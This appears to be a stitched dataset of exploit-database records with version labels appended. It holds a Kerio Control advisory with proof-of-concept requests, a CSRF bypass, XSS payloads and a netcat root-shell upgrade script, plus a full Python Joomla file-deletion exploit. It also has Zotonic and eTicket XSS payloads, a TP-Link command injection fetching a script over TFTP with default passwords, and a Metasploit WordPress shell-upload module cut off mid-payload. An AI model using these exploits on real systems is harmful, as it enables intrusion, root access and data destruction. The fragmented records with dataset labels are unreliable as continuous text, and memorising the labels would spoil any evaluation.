This vulnerability uses a type confusion attack to trigger a use-after-free vulnerability. It can be used to read data and get full code execution. In the case of Kerio Control the result of unserialize is not reflected back to the attacker. It's therefore not possible to read memory from the stack or heap (e.g. to bypass ASLR).  Nevertheless, SEC Consult developed a fully working and reliable (blind) exploit for this vulnerability which spawns a reverse root shell to the Kerio Control system. For this exploit a user account is required. However, it's also possible to conduct the attack via the Internet because the CSRF (Cross Site Request Forgery) check can be bypassed (see below).  An attacker can use this vulnerability to break into a company network via the Internet by tricking a logged in user to visit a malicious website. Even if the user is currently not logged in the attacker can start a bruteforce attack to obtain valid credentials to conduct the attack.   2) PHP script allows heap spraying One of the PHP scripts allows the allocation of memory inside the main binary (winroute) of Kerio Control. Winroute contains the code of most services (e.g. the webserver, PHP, network related functionality, ...). The memory will not be freed after finishing the request and can therefore be used to spray payloads to the whole memory space.  This vulnerability was used in the overall exploit to defeat ASLR. Please bear in mind that it's very likely that an attacker can write a working exploit without heap spraying. Fixing this vulnerability would therefore not prevent the exploitation of the remote code execution vulnerability. For example, the information disclosure vulnerability from this advisory can be used to bypass ASLR as well. This would eliminate the need of heap spraying.   3) CSRF Protection Bypass The PHP scripts contain code to protect against CSRF (Cross Site Request Forgery) attacks. Because of the wrong usage of PHP binary operations and comparisons it's possible to bypass this check. That means that an attacker can trigger requests from other websites which will be handled by Kerio Control. This vulnerability allows to exploit the remote code execution vulnerability from the Internet to break into a network.   4) Webserver running with root privileges The main binary (which contains the webserver and PHP) runs with root privileges.  Kerio told SEC Consult that this vulnerability will not be fixed. SEC Consult strongly recommended otherwise.   5) Reflected Cross Site Scripting (XSS) Kerio Control does not properly encode parameters which are reflected on the website. This leads to cross site scripting vulnerabilities. An attacker can abuse these vulnerabilities to modify the website or do actions in the context of the attacked user.   6) Missing memory corruption protections The main binary (winroute) is not compiled as position-independent executable (PIE). This allowed the use of ROP (return-oriented-programming) code to bypass the not executable heap. Moreover, the stack is per default marked as executable, but the exact location of the stack is randomized by ASLR.   7) Information Disclosure leads to ASLR bypass One of the PHP scripts leaks pointers to the stack and heap. This can be abused by attackers to bypass ASLR. Because stacks are marked as executable an attacker can therefore easily bypass ASLR and DEP/NX.   8) Remote Code Execution as administrator Nearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code execution vulnerability in the administrative web interface in the upgrade functionality. This vulnerability is still unfixed, only the associated XSS vulnerability was fixed. However, an attacker can still exploit it from the Internet, e.g. by abusing the XSS vulnerability described in this advisory (where the CSRF check can be bypassed).  With this vulnerability an attacker can gain a reverse root shell on Kerio Control again if a logged in administrator visits a malicious website on the Internet. More information can also be found in the old advisory: https://www.exploit-db.com/exploits/38450/   9) Login not protected against brute-force attacks There are no bruteforce protections in place for the login. If an unauthenticated victim visits an attacker's website, the attacker can start a bruteforce attack to obtain valid credentials to execute the remote code execution exploit. Via image-loading the attacker can detect if the current credentials are valid (without violating SOP).   Proof of concept: ----------------- 1) Unsafe usage of the PHP unserialize function and outdated PHP version leads    to remote-code-execution The following request can be used to set the unserialize data. In this example a faked string is used which points to 0xffffffff (kernel memory). Unserializing it will therefore crash the remote webserver (the winroute process).  POST /set.php HTTP/1.1 Host: $IP:4081 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 730  k_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:""k_dbName"";s:5:""error"";s:11:""k_dbSummara"";s:3:""abc"";s:14:""k_dbIndividual"";s:3:""abc"";s:16:""k_dbLastUsedType"";s:3:""abc"";s:10:""k_dbLayout"";s:3:""abc"";s:10:""k_pageType"";s:3:""abc"";s:13:""k_periodStart"";i:123;s:11:""k_periodEnd"";i:123;s:8:""k_userId"";i:123;s:6:""tabBar"";i:123;s:13:""k_gotoElement"";i:123;s:9:""k_protoId"";i:123;s:11:""k_errorType"";i:123;s:16:""k_timezoneOffset"";i:123;s:9:""k_groupId"";i:123;s:2:""id"";i:123;s:11:""k_dbSummary"";C:16:""SplObjectStorage"":152:{x:i:2;O:8:""stdClass"":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:""\ff\ff\ff\ff\20\00\00\00\01\00\00\00\06\00\00"";i:1;R:3;}}s:18:""k_historyTimestamp"";s:3:""abc"";}  The following request will call unserialize on the injected data:  GET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1 Host: $IP:4081 Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>; Connection: close  In the example above only a denial of service will be conducted. However, an attacker can change the data type to object to get full code execution on the remote system.  SEC Consult developed a fully working exploit for this attack which spawns a root shell. Please note that this exploit was intentionally written to just target Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets are used which belong to the winroute binary with the SHA256 hash: 2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0 This exploit will not be released for now.  A real-world-attacker can detect the remote binary version by bruteforcing the object handler related to CVE-2014-3515.   2) PHP script allows heap spraying The set.php script contains the following code: $p_variable = urldecode($_POST['k_variable']); $p_value = urldecode($_POST['k_value']); ... $p_session->setSessionVariable($p_variable, $p_value);  POST requests with the following parameters can therefore be used to allocate space on the remote system: k_securityHash=x&target=k_sessionVariable&k_variable=<random_name> &k_value=<payload_to_allocate>  During tests it was possible to spray approximately 400 MB data in 30 seconds which is enough to control two predictable addresses on the heap.   3) CSRF Protection Bypass Two scripts are required for the remote code execution exploit:   -) set.php   -) ContentLoader.php Both scripts contain different very interesting CSRF check bypasses.  The following code can be found in set.php: $p_session->getCsrfToken(&$p_securityHash); $p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash']; if ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) { exit(); }  Since the programming language is PHP (and not JavaScript), the above code code does not work as expected. $p_postedHash can only become 0 or 1 because || is a logical operator. The if-condition compares the valid token with the posted one via the != operator, however, this will not check if types are the same. If k_securityHash is set (either via GET or POST) to any value, the above code will compare the number 1 with a string, which will always bypass the check. It's therefore enough to set k_securityHash to any value to bypass the CSRF protection.  The following code can be found in contentLoader.php: $p_session->getCsrfToken(&$p_securityHash); $p_postedHash = $_GET['k_securityHash']; ... if (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) { $p_page = new p_Page(); $p_page->p_jsCode('window.top.location = ""index.php"";'); $p_page->p_showPageCode(); die(); }  Now the programmers only use the GET parameter, however, they changed the logical operator in the if condition from || to && which means that the CSRF check will only be applied if $p_postedHash is empty. It's therefore again enough to set k_securityHash to any value to bypass the check.   4) Webserver running with root privileges No proof of concept necessary.   5) Reflected Cross Site Scripting (XSS) In the following request the k_historyTimestamp parameter is prone to XSS: https://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x &k_historyTimestamp=aa%22;alert(1)%3b//  In the same request the id parameter can be used to inject JavaScript code. Note that the attack can only be conducted against administrative users. Users with standard privileges can only access pages with k_dbName set to one of the following values:   -) accStats   -) prefs   -) dialup   -) error  In such a case Kerio Control adds code like the following (in this example k_dbName=dialup): var k_newDbName = ""<kerio:text id=""tabCaption_dialup""/>"";  The "" characters within the string are not correctly encoded. This will lead to the termination of the JavaScript execution. Because the injected payload is stored after this code, the attacker must bypass this code to ensure that the payload gets executed. This is only possible if the attacked user is an administrator because administrators can load any dbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like the following will be added instead (which does not crash): var k_newDbName = """";  Another XSS can be found at: https://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A""><script>alert(1);</script><!--   6) Missing memory corruption protections No proof of concept necessary.   7) Information Disclosure leads to ASLR bypass The following request returns information to the currently logged in user (e.g. session token and username):  GET /nonauth/getLoginType.js.php HTTP/1.1 Host: $IP:4081 Cookie: SESSION_CONTROL_WEBIFACE=<valid session ID>; Connection: close  The following is a typical response:  HTTP/1.1 200 OK Connection: Close Content-type: text/html Date: Tue, 24 Aug 2016 11:47:34 GMT Server: Kerio Control Embedded Web Server X-UA-Compatible: IE=edge  k_loginParams.k_loginType = ""loginUnlock"";k_loginParams.k_nonauthToken = ""0xb59066a8"";k_loginParams.k_sessionToken = ""bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660"";k_loginParams.k_loggedUser = {k_asocName: ""user"", k_fullName: ""user""};  The above response contains a valid pointer (0xb59066a8). In most cases this pointer will point to the heap. However, sometimes this pointer will point into a readable and writeable region behind a stack-region. The target location always stores the same data. During the analysis no further effort was spent on analysing this behaviour.  The pointer will also be disclosed if the user is already logged out. In such a case the response looks like:  HTTP/1.1 200 OK Connection: Close Content-type: text/html Date: Tue, 24 Aug 2016 12:04:44 GMT Server: Kerio Control Embedded Web Server X-UA-Compatible: IE=edge  k_loginParams.k_loginType = ""loginCommon"";k_loginParams.k_nonauthToken = ""0xb2ee208"";   An attack scenario can be:   -) The attacker tricks a victim to visit the attacker's malicious website   -) The attacker's website uses the CSRF bypass and the identified XSS      vulnerability to embed a malicious script inside the Kerio Control website   -) The attacker's website iframes the Kerio Control website to trigger the      execution of the XSS payload   -) The XSS payload runs on the same domain and can therefore send requests      and read responses. This means the attacker can send requests to      getLoginType.js.php to obtain a memory pointer.   -) If the memory pointer is within a specific range (e.g. the highest nibble      is zero), it's a pointer to the heap. In such a case the RCE vulnerability      can be used to crash and restart the server. After that the same check can      be done again.   -) If the memory pointer points near a stack (highest nibble is 0xb), the      pointer can be used to calculate the base address of a stack.   -) Now the attacker knows the location of a stack (all stacks are marked as      readable, writeable and executable). He can now easily bypass ASLR and DEP.   8) Remote Code Execution as administrator An attacker can create a malicious upgrade image with the following commands: cat upgrade.sh #!/bin/bash nc -lp 9999 -e /bin/bash &  tar czf upgrade.tar.gz * mv upgrade.tar.gz upgrade.img  The image can be uploaded in the administrative web interface. This will bind a root shell on port 9999. The complete attack can also be conducted via the cross site scripting vulnerability described in this advisory (XSS in contentLoader.php). This enables an attacker to conduct the attack from the Internet to obtain a reverse shell on Kerio Control.   9) Login not protected against brute-force attacks Valid credentials can be obtained via a brute-force attack. It's enough to send a POST request to /internal/dologin.php with the parameters kerio_username and kerio_password set. A remote attacker can detect if the credentials are correct without reading the response (SOP would not allow to read the response). This is possible because /internal/photo will only return a valid image if the user is currently logged in. The attacker can load an image from this URL and check if loading was successful to leak the information if the credentials are valid or not. The following code demonstrates this: <img src=""https://<Kerio-IP>/internal/photo"" onerror=not_logged_in(); onload=logged_in();></img>   Vulnerable / tested versions: ----------------------------- The following product versions were found to be vulnerable which were the latest versions available at the time of the discovery: v9.1.0 (Build 1087) v9.1.1 (Build 1324)   Vendor contact timeline: ------------------------ 2016-08-29: Contacting vendor through website             (bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664 2016-08-31: No answer, contacting CTO of Kerio via email 2016-09-01: Received security contact with PGP & S/MIME certificate 2016-09-01: Transmission of PGP encrypted advisory to Kerio 2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7             Statement to vulnerability 9:             ""the feature already is in the product.""             Statement to vulnerabilities 4 (Webserver running with root             privileges) and 8 (Remote Code Execution as administrator):             ""I do not consider this a vulnerability""             Update including a fix will be available on 2016-09-20 2016-09-09: SEC Consult informed Kerio to re-think the decision             not fixing the vulnerabilities 4, 8 and 9             SEC Consult highly recommends to fix all reported issues 2016-09-13: SEC Consult informed Kerio that the advisory will be             released on 2016-09-22 2016-09-20: Kerio releases patch for Kerio Control 2016-09-22: Coordianted release of security advisory   Solution: --------- The vendor has released version 9.1.3 on 20th September which, according to the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  The vendor told us the following regarding vulnerability 9: ""the feature already is in the product""  Vulnerability 4 and 8 are not considered a vulnerability by the vendor and will not be fixed. SEC Consult strongly recommended fixing issue 4 and 8 as well.  The latest version can be downloaded from here: http://www.kerio.com/support/kerio-control http://www.kerio.com/support/kerio-control/release-history   Workaround: ----------- None   Advisory URL: ------------- https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  SEC Consult Vulnerability Lab  SEC Consult Bangkok - Berlin - Linz - Montreal - Moscow Singapore - Vienna (HQ) - Vilnius - Zurich  About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies.  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Interested to work with the experts of SEC Consult? Send us your application https://www.sec-consult.com/en/Career.htm  Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices https://www.sec-consult.com/en/About/Contact.htm ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  EOF R. Freingruber / @2016","['9.1.0 build 1087/9.1.1 build 1324', '<9.1.3', '9.1.0 build 1087', '9.1.1 build 1324']",1
46710,"Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion # Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion # Date: 2019-March-13 # Exploit Author: Haboob Team # Web Site: haboob.sa # Email: research@haboob.sa # Software Link: https://www.joomla.org/ # Versions: Joomla 1.5.0 through Joomla 3.9.4 # CVE : CVE-2019-10945 # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945 # # Usage: #  List files in the specified directory: #  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory name> # #  Delete file in specified directory #  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory to list>  --rm=<file name>   import re import tempfile import pickle import os import hashlib import urllib  try:     import click except ImportError:     print(""module 'click' doesn't exist, type: pip install click"")     exit(0)  try:     import requests except ImportError:     print(""module 'requests' doesn't exist, type: pip install requests"")     exit(0) try:     import lxml.html except ImportError:     print(""module 'lxml' doesn't exist, type: pip install lxml"")     exit(0)  mediaList = ""?option=com_media&view=mediaList&tmpl=component&folder=/..""  print '''  # Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion # Web Site: Haboob.sa # Email: research@haboob.sa # Versions: Joomla 1.5.0 through Joomla 3.9.4 # https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945      _    _          ____   ____   ____  ____   | |  | |   /\   |  _ \ / __ \ / __ \|  _ \  | |__| |  /  \  | |_) | |  | | |  | | |_) | |  __  | / /\ \ |  _ <| |  | | |  | |  _ <  | |  | |/ ____ \| |_) | |__| | |__| | |_) | |_|  |_/_/    \_\____/ \____/ \____/|____/                                                                          ''' class URL(click.ParamType):     name = 'url'     regex = re.compile(         r'^(?:http)s?://'  # http:// or https://         r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...         r'localhost|'  # localhost...         r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip         r'(?::\d+)?'  # optional port         r'(?:/?|[/?]\S+)$', re.IGNORECASE)      def convert(self, value, param, ctx):         if not isinstance(value, tuple):             if re.match(self.regex, value) is None:                 self.fail('invalid URL (%s)' % value, param, ctx)         return value   def getForm(url, query, cookie=''):     r = requests.get(url, cookies=cookie, timeout=5)     if r.status_code != 200:         print(""invalid URL: 404 NOT FOUND!!"")         exit(0)     page = r.text.encode('utf-8')     html = lxml.html.fromstring(page)     return html.xpath(query), r.cookies   def login(url, username, password):     csrf, cookie = getForm(url, '//input/@name')     postData = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login',                 'return': 'aW5kZXgucGhw', csrf[-1]: 1}      res = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=False)     if res.status_code == 200:         html = lxml.html.fromstring(res.text)         msg = html.xpath(""//div[@class='alert-message']/text()[1]"")         print msg         exit()     else:         get_cookies(res.cookies.get_dict(), url, username, password)   def save_cookies(requests_cookiejar, filename):     with open(filename, 'wb') as f:         pickle.dump(requests_cookiejar, f)   def load_cookies(filename):     with open(filename, 'rb') as f:         return pickle.load(f)   def cookies_file_name(url, username, password):     result = hashlib.md5(str(url) + str(username) + str(password))     _dir = tempfile.gettempdir()     return _dir + ""/"" + result.hexdigest() + "".Jcookie""   def get_cookies(req_cookie, url, username, password):     cookie_file = cookies_file_name(url, username, password)     if os.path.isfile(cookie_file):         return load_cookies(cookie_file)     else:         save_cookies(req_cookie, cookie_file)         return req_cookie   def traversal(url, username, password, dir=None):     cookie = get_cookies('', url, username, password)     url = url + mediaList + dir     files, cookie = getForm(url, ""//input[@name='rm[]']/@value"", cookie)     for file in files:         print file     pass   def removeFile(baseurl, username, password, dir='', file=''):     cookie = get_cookies('', baseurl, username, password)     url = baseurl + mediaList + dir     link, _cookie = getForm(url, ""//a[@target='_top']/@href"", cookie)     if link:         link = urllib.unquote(link[0].encode(""utf8""))         link = link.split('folder=')[0]         link = link.replace(""folder.delete"", ""file.delete"")         link = baseurl + link + ""folder=/.."" + dir + ""&rm[]="" + file         msg, cookie = getForm(link, ""//div[@class='alert-message']/text()[1]"", cookie)         if len(msg) == 0:             print ""ERROR : File does not exist""         else:             print msg     else:         print ""ERROR:404 NOT FOUND!!""   @click.group(invoke_without_command=True) @click.option('--url', type=URL(), help=""Joomla Administrator URL"", required=True) @click.option('--username', type=str, help=""Joomla Manager username"", required=True) @click.option('--password', type=str, help=""Joomla Manager password"", required=True) @click.option('--dir', type=str, help=""listing directory"") @click.option('--rm', type=str, help=""delete file"") @click.pass_context def cli(ctx, url, username, password, dir, rm):     url = url+""/""     cookie_file = cookies_file_name(url, username, password)     if not os.path.isfile(cookie_file):         login(url, username, password)     if dir is not None:         dir = dir.lstrip('/')         dir = dir.rstrip('/')         dir = ""/"" + dir         if dir == ""/"" or dir == ""../"" or dir == ""/."":             dir = ''     else:         dir = ''     print dir     if rm is not None:         removeFile(url, username, password, dir, rm)     else:         traversal(url, username, password, dir)   cli()","['1.5.0 - 3.9.4', '(1.5.0 through 3.9.4)', 'through 3.9.4)']",1
46788,"Zotonic < 0.47.0 mod_admin - Cross-Site Scripting # Exploit Title: Zotonic <=0.46 mod_admin (Erlang) - Reflective Cross-Site Scripting # Date: 24-04-2019 # Exploit Author: Ramòn Janssen # Researchers: Jan-martin Sijs, Joost Quist, Joost Vondeling, Ramòn Janssen # Vendor Homepage: http://zotonic.com/ # Software Link: https://github.com/zotonic/zotonic/releases/tag/0.46.0 # Version: <=0.46 # CVE : CVE-2019-11504  Attack type Remote  Impact Code Execution  Zotonic versions prior to 0.47 have multiple authenticated Reflected Cross-Site Scripting (XSS) vulnerabilities in the management module. The vulnerabilitie can be exploited when an authenticated user with administrative permissions visits the crafted URL (i.e. when phished or visits a website containing the URL). The XSS effects the following URLs and parameters of the management module: - /admin/overview/ [qcat, qcustompivot, qs] - /admin/users/ [qs] - /admin/media/ [qcat,qcustompivot, qs]  Example: https://[host]/admin/overview?qcustompivot=""><script>prompt(‘XSS’)</script>  Affected source code file zotonic_mod_admin: - zotonic_mod_admin_identity\priv\templates\_admin_sort_header.tpl - zotonic_mod_admin_identity\priv\templates\admin_users.tpl  Reference(s) http://docs.zotonic.com/en/latest/developer-guide/releasenotes/rel_0.47.0.html","['< 0.47.0 mod_admin', 'prior to 0.47']",1
34254,"TP-Link TL-WR740N v4 Router (FW-Ver. 3.16.6 Build 130529 Rel.47286n) - Command Execution # Exploit Title: TP-Link TL-WR740N v4 router (FW-Ver. 3.16.6 Build 130529 Rel.47286n) arbitrary shell command execution # Date: 08/03/2014 # Exploit Author: Christoph Kuhl # Vendor Homepage: http://www.tp-link.com # Software Link:  http://www.tp-link.com.de/resources/software/TL-WR740N_V4_130529.zip # Version: FW-Ver. 3.16.6 Build 130529 Rel.47286n # Tested on: TP-Link TL-WR740N v4  Exploit: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/34254.7z (Password: TP-P0wned-Link)  Vulnerability description: The domain name parameters of the ""Parental Control"" and ""Access  Control"" features of the TP-Link TL-WR740N v4 (FW-Ver. 3.16.6 Build  130529 Rel.47286n) router are prone to arbitrary shell command execution  as root for users who are authenticated against the web interface. Each shell payload is restricted up to 28 bytes. The ""Parental Control""  feature allows you to specify 8 domains (= 8 commands) so you have 8 x  28 = 244 bytes of shell commands. This is sufficient to post-load and  execute a shell script of arbitrary length from a tftp server. Employing this method one can gain full control over the device when  post-loading a mightier busybox MIPS binary and executing telnetd or  using netcat to connect back. Default login credentials are known to be  root:5up, Admin:5up or ap71:.  Technical Cause: The web interface and the whole routing logic on the device is  controlled by a single homebrew process (httpd) running as root. This binary is employing various fopen() and system() calls in order to  configure the device. One of these calls refers to a script (/tmp/wr841n/parent.sh) being  filled with user input data from the ""Parental Control"" mask.  ... iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source  00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls USER INPUT  HERE,return1 -j RETURN iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source  00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ANOTHER USER  INPUT HERE,return1 -j RETURN ...  The input data is only poorly checked by some JavaScript functions but  the server accepts most characters. Entering a shell command surrounded  by ';' will result in code execution:  ... iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source  00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ;tftp -gr a  192.168.0.1;,;sh a;,return1 -j RETURN ...  The same goes for the Access Control Feature. The only difference is  that the script name is /tmp/wr841n/accessCtrl.sh. The attack is persistent until resetting the parental control or access  control settings. After rebooting the device will execute the commands  again. This vulnerability may or may not affect other TP-Link hardware and  software versions. However it was only tested against TP-Link TL-WR740N  v4 (FW-Ver. 3.16.6 Build 130529 Rel.47286n) within the local network.   Exploit POC code description: The exploit tries to load and execute a shell script called 'a' (for  attack) from the specified tftpd server. This is for the circumventing  the length restriction of 28 bytes and the fact that the preloaded  busybox binary is a bit restricted (no netcat and telnetd available). The 'a' script then loads a mightier busybox (filename busyboxx) binary  from the tftp server specified in that 'a' script (default 192.168.0.1).  It also sets up a more comfortable environment and starts telnetd as  well as a ftp server. You can then connect to the router via telnet and ftp. The exploit code is written in C# (.NET 4.5) so you need .NET Framework  4.5 to execute it.  Usage: ParentalControlExploit.exe [/a | /p] [RouterIp] [RouterWebIfaceUsername]  [RouterWebIfacePassword] [TFTPServerIp]  TP-Link TL-WR740N v4 parental control and access control exploit. 2014  by C. Kuhl.   Options:     /a            Use Access Control Exploit     /p            Use Parental Control Exploit     [RouterIp]    IP of the target to attack (default 192.168.0.1)     [Username]    Username of the Webinterface Login (default admin)     [Password]    Username of the Webinterface Login (default admin)     [TFTPServer]  TFTP Host where the 'a' shell file is hosted for execution  Example: ParentalControlExploit.exe /a 192.168.0.1 admin admin 192.168.0.100   History of the flaw: 07/01/2014    -    Found it 07/05/2014    -    Notified TP Link via their Online Support Contact  form including detailed description and link to POC exploit 07/14/2014    -    Got answer via mail that they could not reproduce the  flaw via the router's web interface and asked for more information. 07/26/2014    -    Replied to TP-Link that one cannot reproduce the bug  via the router's web interface due to the javascript ""check logic"" and  that they need to either employ direct GET requests or use the provided  exploit 07/29/2014    -    TP Link states that this was no security flaw because  the attacker had to know the credientials to the webinterface. It was  like giving the key to your flat to a housebreaker. 08/03/2014    -    Publication","['v4', '3.16.6 Build 130529 Rel.47286n)']",0
31069,"eTicket 1.5.6-RC4 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/27473/info  eTicket is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  eTicket 1.5.6-RC4 is vulnerable; prior versions may also be affected.  http://www.example.com/index.php/""><script>alert('XSS')</script>",['1.5.6-RC4'],1
46662,"WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::FileDropper   include Msf::Exploit::Remote::HTTP::Wordpress    def initialize(info = {})     super(update_info(       info,       'Name'            => 'WordPress Crop-image Shell Upload',       'Description'     => %q{           This module exploits a path traversal and a local file inclusion           vulnerability on WordPress versions 5.0.0 and <= 4.9.8.           The crop-image function allows a user, with at least author privileges,           to resize an image and perform a path traversal by changing the _wp_attached_file           reference during the upload. The second part of the exploit will include           this image in the current theme by changing the _wp_page_template attribute           when creating a post.            This exploit module only works for Unix-based systems currently.       },       'License'         => MSF_LICENSE,       'Author'          =>       [         'RIPSTECH Technology',                               # Discovery         'Wilfried Becard <wilfried.becard@synacktiv.com>'    # Metasploit module       ],     'References'      =>       [         [ 'CVE', '2019-8942' ],         [ 'CVE', '2019-8943' ],         [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/']       ],       'DisclosureDate'  => 'Feb 19 2019',       'Platform'        => 'php',       'Arch'            => ARCH_PHP,       'Targets'         => [['WordPress', {}]],       'DefaultTarget'   => 0     ))      register_options(       [         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])       ])   end    def check     cookie = wordpress_login(username, password)     if cookie.nil?       store_valid_credential(user: username, private: password, proof: cookie)       return CheckCode::Safe     end      CheckCode::Appears   end    def username     datastore['USERNAME']   end    def password     datastore['PASSWORD']   end    def get_wpnonce(cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php')     res = send_request_cgi(       'method'    => 'GET',       'uri'       => uri,       'cookie' => cookie     )     if res && res.code == 200 && res.body && !res.body.empty?       res.get_hidden_inputs.first[""_wpnonce""]     end   end    def get_wpnonce2(image_id, cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')     res = send_request_cgi(       'method'    => 'GET',       'uri'       => uri,       'cookie'    => cookie,       'vars_get'  => {         'post'   => image_id,         'action' => ""edit""       }     )     if res && res.code == 200 && res.body && !res.body.empty?       tmp = res.get_hidden_inputs       wpnonce2 = tmp[1].first[1]     end   end    def get_current_theme     uri = normalize_uri(datastore['TARGETURI'])     res = send_request_cgi!(       'method'    => 'GET',       'uri'       => uri     )     fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res && res.code == 200 && res.body && !res.body.empty?      theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first     fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme      theme   end    def get_ajaxnonce(cookie)     uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')     res = send_request_cgi(       'method'    => 'POST',       'uri'       => uri,       'cookie' => cookie,       'vars_post'  => {         'action' => 'query-attachments',         'post_id' => '0',         'query[item]' => '43',         'query[orderby]' => 'date',         'query[order]' => 'DESC',         'query[posts_per_page]' => '40',         'query[paged]' => '1'       }     )     fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res && res.code == 200 && res.body && !res.body.empty?     a_nonce = res.body.scan(/""edit"":""(\w+)""/).flatten.first     fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce      a_nonce   end    def upload_file(img_name, wp_nonce, cookie)     img_data = %w[       FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F       74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00       10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00       3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69       6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D       20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09       08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D       27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06       09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24       24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24       24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF       C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06       07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01       02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1       15 52 D1 F0 24 33 